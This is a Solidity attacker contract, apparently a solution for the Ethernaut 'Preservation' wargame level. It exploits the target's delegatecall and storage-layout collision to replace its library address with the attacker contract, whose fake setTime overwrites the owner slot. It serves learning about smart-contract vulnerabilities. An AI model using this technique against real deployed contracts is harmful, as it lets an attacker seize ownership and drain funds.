// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Preservation} from "../../src/ethernaut/16_Preservation/Preservation.sol";

contract Preservation_Attacker {
	address public timeZone1Library;
	address public timeZone2Library;
	address public owner;
	
	address player;
	Preservation coreInst;
	
	constructor(Preservation coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		uint256 attackerAddress = uint256(uint160(address(this)));
		
		coreInst.setFirstTime(attackerAddress);
		require(coreInst.timeZone1Library() == address(this));
	}
	
	function setTime(uint256 _time) public {
		owner = msg.sender;
	}
}
